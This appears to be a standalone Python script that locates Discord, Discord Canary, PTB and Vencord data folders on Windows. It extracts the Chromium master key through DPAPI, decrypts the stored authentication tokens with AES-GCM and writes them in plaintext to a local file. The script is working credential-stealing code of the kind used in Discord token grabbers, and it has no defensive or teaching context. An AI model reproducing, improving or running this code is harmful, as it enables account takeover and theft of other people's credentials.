import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        local_state = f.read()
    local_state = json.loads(local_state)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
    
def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        return None

def get_tokens(base_path):
    local_state_path = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state_path):
        return []

    master_key = get_master_key(local_state_path)
    print("Master key extracted successfully.")
    leveldb_path = os.path.join(base_path, "Local Storage", "leveldb")
    
    tokens = []
    
    if not os.path.exists(leveldb_path):
        return []

    for file_name in os.listdir(leveldb_path):
        if not (file_name.endswith(".ldb") or file_name.endswith(".log")):
            continue
            
        try:
            with open(os.path.join(leveldb_path, file_name), "rb") as f:
                content = f.read() 
                
            if b"dQw4w9WgXcQ" not in content:
                continue
            
            for line in [x.strip() for x in content.split(b"dQw4w9WgXcQ")]:
                if len(line) < 100: continue
                
                candidate = line
                if candidate.startswith(b":"):
                    candidate = candidate[1:]
                
                encrypted_b64 = candidate.split(b'"')[0]
                
                try:
                    encrypted_section = base64.b64decode(encrypted_b64)
                    token = decrypt_password(encrypted_section, master_key)
                    if token:
                        tokens.append(token)
                except Exception as e:
                    continue
        except Exception as e:
            pass
            
    return list(set(tokens))

def main():
    appdata = os.getenv("APPDATA")
    output_file = "C:\Users\yamet\Downloads\tokens.txt"
    with open(output_file, "w", encoding="utf-8") as out:
        paths = {
            "Discord": os.path.join(appdata, "discord"),
            "Discord Canary": os.path.join(appdata, "discordcanary"),
            "Discord PTB": os.path.join(appdata, "discordptb"),
            "Vencord": os.path.join(appdata, "Vencord"),
        }

        out.write("Searching for Discord tokens...\n")
        found = False
        for name, path in paths.items():
            if os.path.exists(path):
                out.write(f"Checking existence of {path}...\n")
                out.write(f"Checking {name} at {path}\n")
                found_tokens = get_tokens(path)
                if found_tokens:
                    out.write(f"version of discord: {name}\n")
                    for token in found_tokens:
                        out.write(f"Token: {token}\n")
                    out.write("\n")
                    found = True
        
        if not found:
            out.write("\nNo tokens found.\n")
    print(f"Results written to {output_file}")

if __name__ == "__main__":
    main()
